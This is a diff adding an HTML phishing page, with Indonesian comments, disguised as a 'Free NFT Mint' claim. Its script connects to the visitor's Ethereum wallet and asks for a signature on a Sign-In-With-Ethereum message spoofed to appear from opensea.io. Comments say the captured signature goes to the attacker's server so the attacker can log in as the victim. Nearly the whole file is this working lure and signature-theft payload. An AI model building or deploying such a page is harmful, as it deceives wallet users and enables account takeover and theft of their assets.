@@ -1,0 +1,50 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Free NFT Mint</title>
+</head>
+<body>
+  <h1>Free NFT Mint - Click to claim</h1>
+  <button id="go">Claim NFT</button>
+  <pre id="log"></pre>
+
+<script>
+const SPOOFED_DOMAIN = "opensea.io";      // ganti ke target SIWE service apapun
+const log = (m) => { document.getElementById('log').textContent += m + "\n"; };
+
+document.getElementById('go').onclick = async () => {
+  if (!window.ethereum) { log("no provider"); return; }
+
+  const [addr] = await ethereum.request({ method: 'eth_requestAccounts' });
+  log("connected: " + addr);
+
+  // SIWE message yang mengaku berasal dari opensea.io
+  const msg =
+`${SPOOFED_DOMAIN} wants you to sign in with your Ethereum account:
+${addr}
+
+Sign in to OpenSea.
+
+URI: https://${SPOOFED_DOMAIN}
+Version: 1
+Chain ID: 1
+Nonce: ${crypto.randomUUID().replace(/-/g,'').slice(0,16)}
+Issued At: ${new Date().toISOString()}`;
+
+  const hex = '0x' + [...new TextEncoder().encode(msg)]
+                       .map(b => b.toString(16).padStart(2, '0')).join('');
+
+  // Wallet akan menampilkan: "Sign in to opensea.io"
+  // padahal origin sebenarnya adalah halaman ini (attacker.example).
+  const sig = await ethereum.request({
+    method: 'personal_sign',
+    params: [hex, addr]
+  });
+
+  log("signature: " + sig);
+  log("=> kirim ke server attacker untuk login sebagai " + addr + " di " + SPOOFED_DOMAIN);
+};
+</script>
+</body>
+</html>
